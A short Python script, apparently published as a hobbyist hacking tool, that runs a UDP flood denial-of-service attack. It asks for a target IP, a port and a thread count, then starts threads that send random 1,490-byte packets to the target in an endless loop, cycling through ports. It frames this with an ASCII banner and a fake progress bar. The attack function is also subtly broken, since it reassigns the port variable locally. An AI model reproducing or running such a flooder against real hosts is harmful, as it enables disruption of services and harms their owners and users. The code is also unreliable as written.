import sys
import os
import time
import socket
import random
import threading
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet DDos Attack")
print("""
-------------------------------------------------------------------------------------------------
|                                                                                                 |
|                                                                                                 |
|      ________   ___  ___  ___  __    _______   ________  ________  ________  ________           |
|     |\   ___  \|\  \|\  \|\  \|\  \ |\  ___ \ |\   ___ \|\   ___ \|\   __  \|\   ____\          |
|     \ \  \\ \  \ \  \\\  \ \  \/  /|\ \   __/|\ \  \_|\ \ \  \_|\ \ \  \|\  \ \  \___|_         |
|      \ \  \\ \  \ \  \\\  \ \   ___  \ \  \_|/_\ \  \ \\ \ \  \ \\ \ \  \\\  \ \_____  \        |
|       \ \  \\ \  \ \  \\\  \ \  \\ \  \ \  \_|\ \ \  \_\\ \ \  \_\\ \ \  \\\  \|____|\  \       |
|        \ \__\\ \__\ \_______\ \__\\ \__\ \_______\ \_______\ \_______\ \_______\____\_\  \      |
|         \|__| \|__|\|_______|\|__| \|__|\|_______|\|_______|\|_______|\|_______|\_________\     |
|                                                                                \|_________|     |
|                                                                                                 |
|                                                                                                 |
-------------------------------------------------------------------------------------------------
""")
print("Author   : Laila19")
print("GitHub   : https://github.com/lailacypher")
print()

ip = input("Target IP: ")
port = int(input("Port: "))
threads = int(input("Number of Threads: "))

def attack():
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port = port + 1
        print(f"Sent {sent} packet(s) to {ip} through port: {port}")
        
        if port == 65534:
            port = 1

os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(1)
print("[=====               ] 25%")
time.sleep(1)
print("[==========          ] 50%")
time.sleep(1)
print("[===============     ] 75%")
time.sleep(1)
print("[====================] 100%")
time.sleep(2)

for _ in range(threads):
    t = threading.Thread(target=attack)
    t.start()
